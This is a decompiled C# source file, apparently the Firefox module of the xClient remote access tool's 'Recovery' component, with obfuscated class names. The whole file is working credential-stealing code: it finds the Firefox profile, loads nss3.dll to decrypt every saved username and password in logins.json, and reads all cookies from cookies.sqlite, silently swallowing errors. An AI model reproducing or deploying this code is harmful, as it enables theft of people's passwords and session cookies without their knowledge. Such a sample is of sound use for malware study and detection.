using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000A7 RID: 167
	public static class Firefox
	{
		// Token: 0x06000458 RID: 1112 RVA: 0x00010050 File Offset: 0x0000E250
		static Firefox()
		{
			try
			{
				Firefox.firefoxPath = Firefox.GetFirefoxInstallPath();
				if (Firefox.firefoxPath == null)
				{
					throw new NullReferenceException("Firefox is not installed, or the install path could not be located");
				}
				Firefox.firefoxProfilePath = Firefox.GetProfilePath();
				if (Firefox.firefoxProfilePath == null)
				{
					throw new NullReferenceException("Firefox does not have any profiles, has it ever been launched?");
				}
				Firefox.firefoxLoginFile = Firefox.GetFile(Firefox.firefoxProfilePath, "logins.json");
				if (Firefox.firefoxLoginFile == null)
				{
					throw new NullReferenceException("Firefox does not have any logins.json file");
				}
				Firefox.firefoxCookieFile = Firefox.GetFile(Firefox.firefoxProfilePath, "cookies.sqlite");
				if (Firefox.firefoxCookieFile == null)
				{
					throw new NullReferenceException("Firefox does not have any cookie file");
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000459 RID: 1113 RVA: 0x000100F8 File Offset: 0x0000E2F8
		public static List<GClass32> GetSavedPasswords()
		{
			List<GClass32> list = new List<GClass32>();
			try
			{
				Firefox.InitializeDelegates(Firefox.firefoxProfilePath, Firefox.firefoxPath);
				Firefox.JsonFFData jsonFFData = new Firefox.JsonFFData();
				using (StreamReader streamReader = new StreamReader(Firefox.firefoxLoginFile.FullName))
				{
					string json = streamReader.ReadToEnd();
					jsonFFData = GClass31.smethod_1<Firefox.JsonFFData>(json);
				}
				foreach (Firefox.Login login in jsonFFData.logins)
				{
					string username = Firefox.Decrypt(login.encryptedUsername);
					string password = Firefox.Decrypt(login.encryptedPassword);
					Uri uri = new Uri(login.formSubmitURL);
					list.Add(new GClass32
					{
						URL = uri.AbsoluteUri,
						Username = username,
						Password = password,
						Application = "Firefox"
					});
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x0600045A RID: 1114 RVA: 0x00010210 File Offset: 0x0000E410
		public static List<FirefoxCookie> GetSavedCookies()
		{
			List<FirefoxCookie> list = new List<FirefoxCookie>();
			GClass33 gclass = new GClass33(Firefox.firefoxCookieFile.FullName);
			if (!gclass.method_9("moz_cookies"))
			{
				throw new Exception("Could not read cookie table");
			}
			int num = gclass.method_2();
			for (int i = 0; i < num; i++)
			{
				try
				{
					string host = gclass.method_5(i, "host");
					string name = gclass.method_5(i, "name");
					string value = gclass.method_5(i, "value");
					string path = gclass.method_5(i, "path");
					bool secure = !(gclass.method_5(i, "isSecure") == "0");
					bool httpOnly = !(gclass.method_5(i, "isSecure") == "0");
					long num2 = long.Parse(gclass.method_5(i, "expiry"));
					long num3 = Firefox.ToUnixTime(DateTime.Now);
					DateTime expiresUTC = Firefox.FromUnixTime(num2);
					bool expired = num3 > num2;
					list.Add(new FirefoxCookie
					{
						Host = host,
						ExpiresUTC = expiresUTC,
						Expired = expired,
						Name = name,
						Value = value,
						Path = path,
						Secure = secure,
						HttpOnly = httpOnly
					});
				}
				catch (Exception)
				{
					return list;
				}
			}
			return list;
		}

		// Token: 0x0600045B RID: 1115 RVA: 0x0001037C File Offset: 0x0000E57C
		private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
		{
			if (new Version(FileVersionInfo.GetVersionInfo(firefoxPath.FullName + "\\firefox.exe").FileVersion).Major < new Version("35.0.0").Major)
			{
				return;
			}
			GClass26.LoadLibrary(firefoxPath.FullName + "\\msvcr100.dll");
			GClass26.LoadLibrary(firefoxPath.FullName + "\\msvcp100.dll");
			GClass26.LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
			GClass26.LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
			GClass26.LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
			Firefox.nssModule = GClass26.LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
			IntPtr procAddress = GClass26.GetProcAddress(Firefox.nssModule, "NSS_Init");
			Firefox.NSS_InitPtr nss_InitPtr = (Firefox.NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Firefox.NSS_InitPtr));
			nss_InitPtr(firefoxProfilePath.FullName);
			long slot = Firefox.PK11_GetInternalKeySlot();
			Firefox.PK11_Authenticate(slot, true, 0L);
		}

		// Token: 0x0600045C RID: 1116 RVA: 0x00010494 File Offset: 0x0000E694
		private static DateTime FromUnixTime(long unixTime)
		{
			DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
			return dateTime.AddSeconds((double)unixTime);
		}

		// Token: 0x0600045D RID: 1117 RVA: 0x000104BC File Offset: 0x0000E6BC
		private static long ToUnixTime(DateTime value)
		{
			return (long)(value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime()).TotalSeconds;
		}

		// Token: 0x0600045E RID: 1118 RVA: 0x000104F0 File Offset: 0x0000E6F0
		private static DirectoryInfo GetProfilePath()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
			if (!Directory.Exists(path))
			{
				throw new Exception("Firefox Application Data folder does not exist!");
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			if (directories.Length == 0)
			{
				throw new IndexOutOfRangeException("No Firefox profiles could be found");
			}
			return directories[0];
		}

		// Token: 0x0600045F RID: 1119 RVA: 0x00010544 File Offset: 0x0000E744
		private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
		{
			FileInfo[] files = profilePath.GetFiles(searchTerm);
			int num = 0;
			if (0 >= files.Length)
			{
				throw new Exception("No Firefox logins.json was found");
			}
			return files[num];
		}

		// Token: 0x06000460 RID: 1120 RVA: 0x00010578 File Offset: 0x0000E778
		private static DirectoryInfo GetFirefoxInstallPath()
		{
			using (RegistryKey registryKey = GClass8.Is64Bit ? GClass9.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Mozilla\\Mozilla Firefox") : GClass9.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Mozilla\\Mozilla Firefox"))
			{
				if (registryKey == null)
				{
					return null;
				}
				string[] subKeyNames = registryKey.GetSubKeyNames();
				if (subKeyNames.Length == 0)
				{
					throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
				}
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[0]))
				{
					string text = registryKey2.smethod_2("Main").smethod_1("Install Directory", "");
					if (string.IsNullOrEmpty(text))
					{
						throw new NullReferenceException("Install string was null or empty");
					}
					Firefox.firefoxPath = new DirectoryInfo(text);
				}
			}
			return Firefox.firefoxPath;
		}

		// Token: 0x06000461 RID: 1121 RVA: 0x0001064C File Offset: 0x0000E84C
		private static IntPtr LoadWin32Library(string libPath)
		{
			if (string.IsNullOrEmpty(libPath))
			{
				throw new ArgumentNullException("libPath");
			}
			IntPtr intPtr = GClass26.LoadLibrary(libPath);
			if (intPtr == IntPtr.Zero)
			{
				int lastWin32Error = Marshal.GetLastWin32Error();
				Win32Exception ex = new Win32Exception(lastWin32Error);
				ex.Data.Add("LastWin32Error", lastWin32Error);
				throw new Exception("can't load DLL " + libPath, ex);
			}
			return intPtr;
		}

		// Token: 0x06000462 RID: 1122 RVA: 0x000106B8 File Offset: 0x0000E8B8
		private static long PK11_GetInternalKeySlot()
		{
			IntPtr procAddress = GClass26.GetProcAddress(Firefox.nssModule, "PK11_GetInternalKeySlot");
			Firefox.PK11_GetInternalKeySlotPtr pk11_GetInternalKeySlotPtr = (Firefox.PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Firefox.PK11_GetInternalKeySlotPtr));
			return pk11_GetInternalKeySlotPtr();
		}

		// Token: 0x06000463 RID: 1123 RVA: 0x000106F4 File Offset: 0x0000E8F4
		private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
		{
			IntPtr procAddress = GClass26.GetProcAddress(Firefox.nssModule, "PK11_Authenticate");
			Firefox.PK11_AuthenticatePtr pk11_AuthenticatePtr = (Firefox.PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Firefox.PK11_AuthenticatePtr));
			return pk11_AuthenticatePtr(slot, loadCerts, wincx);
		}

		// Token: 0x06000464 RID: 1124 RVA: 0x00010730 File Offset: 0x0000E930
		private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
		{
			IntPtr procAddress = GClass26.GetProcAddress(Firefox.nssModule, "NSSBase64_DecodeBuffer");
			Firefox.NSSBase64_DecodeBufferPtr nssbase64_DecodeBufferPtr = (Firefox.NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Firefox.NSSBase64_DecodeBufferPtr));
			return nssbase64_DecodeBufferPtr(arenaOpt, outItemOpt, inStr, inLen);
		}

		// Token: 0x06000465 RID: 1125 RVA: 0x00010770 File Offset: 0x0000E970
		private static int PK11SDR_Decrypt(ref Firefox.TSECItem data, ref Firefox.TSECItem result, int cx)
		{
			IntPtr procAddress = GClass26.GetProcAddress(Firefox.nssModule, "PK11SDR_Decrypt");
			Firefox.PK11SDR_DecryptPtr pk11SDR_DecryptPtr = (Firefox.PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Firefox.PK11SDR_DecryptPtr));
			return pk11SDR_DecryptPtr(ref data, ref result, cx);
		}

		// Token: 0x06000466 RID: 1126 RVA: 0x000107AC File Offset: 0x0000E9AC
		private static string Decrypt(string cypherText)
		{
			StringBuilder stringBuilder = new StringBuilder(cypherText);
			int value = Firefox.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
			Firefox.TSECItem tsecitem = default(Firefox.TSECItem);
			Firefox.TSECItem tsecitem2 = (Firefox.TSECItem)Marshal.PtrToStructure(new IntPtr(value), typeof(Firefox.TSECItem));
			if (Firefox.PK11SDR_Decrypt(ref tsecitem2, ref tsecitem, 0) == 0 && tsecitem.SECItemLen != 0)
			{
				byte[] array = new byte[tsecitem.SECItemLen];
				Marshal.Copy(new IntPtr(tsecitem.SECItemData), array, 0, tsecitem.SECItemLen);
				return Encoding.UTF8.GetString(array);
			}
			return null;
		}

		// Token: 0x040001D2 RID: 466
		private static IntPtr nssModule;

		// Token: 0x040001D3 RID: 467
		private static DirectoryInfo firefoxPath;

		// Token: 0x040001D4 RID: 468
		private static DirectoryInfo firefoxProfilePath;

		// Token: 0x040001D5 RID: 469
		private static FileInfo firefoxLoginFile;

		// Token: 0x040001D6 RID: 470
		private static FileInfo firefoxCookieFile;

		// Token: 0x020000A8 RID: 168
		// (Invoke) Token: 0x06000468 RID: 1128
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long NSS_InitPtr(string configdir);

		// Token: 0x020000A9 RID: 169
		// (Invoke) Token: 0x0600046C RID: 1132
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate int PK11SDR_DecryptPtr(ref Firefox.TSECItem data, ref Firefox.TSECItem result, int cx);

		// Token: 0x020000AA RID: 170
		// (Invoke) Token: 0x06000470 RID: 1136
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long PK11_GetInternalKeySlotPtr();

		// Token: 0x020000AB RID: 171
		// (Invoke) Token: 0x06000474 RID: 1140
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

		// Token: 0x020000AC RID: 172
		// (Invoke) Token: 0x06000478 RID: 1144
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

		// Token: 0x020000AD RID: 173
		private struct TSECItem
		{
			// Token: 0x040001D7 RID: 471
			public int SECItemType;

			// Token: 0x040001D8 RID: 472
			public int SECItemData;

			// Token: 0x040001D9 RID: 473
			public int SECItemLen;
		}

		// Token: 0x020000AE RID: 174
		public class Login
		{
			// Token: 0x170000BB RID: 187
			// (get) Token: 0x0600047B RID: 1147 RVA: 0x00004357 File Offset: 0x00002557
			// (set) Token: 0x0600047C RID: 1148 RVA: 0x0000435F File Offset: 0x0000255F
			public int id { get; set; }

			// Token: 0x170000BC RID: 188
			// (get) Token: 0x0600047D RID: 1149 RVA: 0x00004368 File Offset: 0x00002568
			// (set) Token: 0x0600047E RID: 1150 RVA: 0x00004370 File Offset: 0x00002570
			public string hostname { get; set; }

			// Token: 0x170000BD RID: 189
			// (get) Token: 0x0600047F RID: 1151 RVA: 0x00004379 File Offset: 0x00002579
			// (set) Token: 0x06000480 RID: 1152 RVA: 0x00004381 File Offset: 0x00002581
			public object httpRealm { get; set; }

			// Token: 0x170000BE RID: 190
			// (get) Token: 0x06000481 RID: 1153 RVA: 0x0000438A File Offset: 0x0000258A
			// (set) Token: 0x06000482 RID: 1154 RVA: 0x00004392 File Offset: 0x00002592
			public string formSubmitURL { get; set; }

			// Token: 0x170000BF RID: 191
			// (get) Token: 0x06000483 RID: 1155 RVA: 0x0000439B File Offset: 0x0000259B
			// (set) Token: 0x06000484 RID: 1156 RVA: 0x000043A3 File Offset: 0x000025A3
			public string usernameField { get; set; }

			// Token: 0x170000C0 RID: 192
			// (get) Token: 0x06000485 RID: 1157 RVA: 0x000043AC File Offset: 0x000025AC
			// (set) Token: 0x06000486 RID: 1158 RVA: 0x000043B4 File Offset: 0x000025B4
			public string passwordField { get; set; }

			// Token: 0x170000C1 RID: 193
			// (get) Token: 0x06000487 RID: 1159 RVA: 0x000043BD File Offset: 0x000025BD
			// (set) Token: 0x06000488 RID: 1160 RVA: 0x000043C5 File Offset: 0x000025C5
			public string encryptedUsername { get; set; }

			// Token: 0x170000C2 RID: 194
			// (get) Token: 0x06000489 RID: 1161 RVA: 0x000043CE File Offset: 0x000025CE
			// (set) Token: 0x0600048A RID: 1162 RVA: 0x000043D6 File Offset: 0x000025D6
			public string encryptedPassword { get; set; }

			// Token: 0x170000C3 RID: 195
			// (get) Token: 0x0600048B RID: 1163 RVA: 0x000043DF File Offset: 0x000025DF
			// (set) Token: 0x0600048C RID: 1164 RVA: 0x000043E7 File Offset: 0x000025E7
			public string guid { get; set; }

			// Token: 0x170000C4 RID: 196
			// (get) Token: 0x0600048D RID: 1165 RVA: 0x000043F0 File Offset: 0x000025F0
			// (set) Token: 0x0600048E RID: 1166 RVA: 0x000043F8 File Offset: 0x000025F8
			public int encType { get; set; }

			// Token: 0x170000C5 RID: 197
			// (get) Token: 0x0600048F RID: 1167 RVA: 0x00004401 File Offset: 0x00002601
			// (set) Token: 0x06000490 RID: 1168 RVA: 0x00004409 File Offset: 0x00002609
			public long timeCreated { get; set; }

			// Token: 0x170000C6 RID: 198
			// (get) Token: 0x06000491 RID: 1169 RVA: 0x00004412 File Offset: 0x00002612
			// (set) Token: 0x06000492 RID: 1170 RVA: 0x0000441A File Offset: 0x0000261A
			public long timeLastUsed { get; set; }

			// Token: 0x170000C7 RID: 199
			// (get) Token: 0x06000493 RID: 1171 RVA: 0x00004423 File Offset: 0x00002623
			// (set) Token: 0x06000494 RID: 1172 RVA: 0x0000442B File Offset: 0x0000262B
			public long timePasswordChanged { get; set; }

			// Token: 0x170000C8 RID: 200
			// (get) Token: 0x06000495 RID: 1173 RVA: 0x00004434 File Offset: 0x00002634
			// (set) Token: 0x06000496 RID: 1174 RVA: 0x0000443C File Offset: 0x0000263C
			public int timesUsed { get; set; }
		}

		// Token: 0x020000AF RID: 175
		public class JsonFFData
		{
			// Token: 0x170000C9 RID: 201
			// (get) Token: 0x06000498 RID: 1176 RVA: 0x00004445 File Offset: 0x00002645
			// (set) Token: 0x06000499 RID: 1177 RVA: 0x0000444D File Offset: 0x0000264D
			public int nextId { get; set; }

			// Token: 0x170000CA RID: 202
			// (get) Token: 0x0600049A RID: 1178 RVA: 0x00004456 File Offset: 0x00002656
			// (set) Token: 0x0600049B RID: 1179 RVA: 0x0000445E File Offset: 0x0000265E
			public List<Firefox.Login> logins { get; set; }

			// Token: 0x170000CB RID: 203
			// (get) Token: 0x0600049C RID: 1180 RVA: 0x00004467 File Offset: 0x00002667
			// (set) Token: 0x0600049D RID: 1181 RVA: 0x0000446F File Offset: 0x0000266F
			public List<object> disabledHosts { get; set; }

			// Token: 0x170000CC RID: 204
			// (get) Token: 0x0600049E RID: 1182 RVA: 0x00004478 File Offset: 0x00002678
			// (set) Token: 0x0600049F RID: 1183 RVA: 0x00004480 File Offset: 0x00002680
			public int version { get; set; }
		}
	}
}
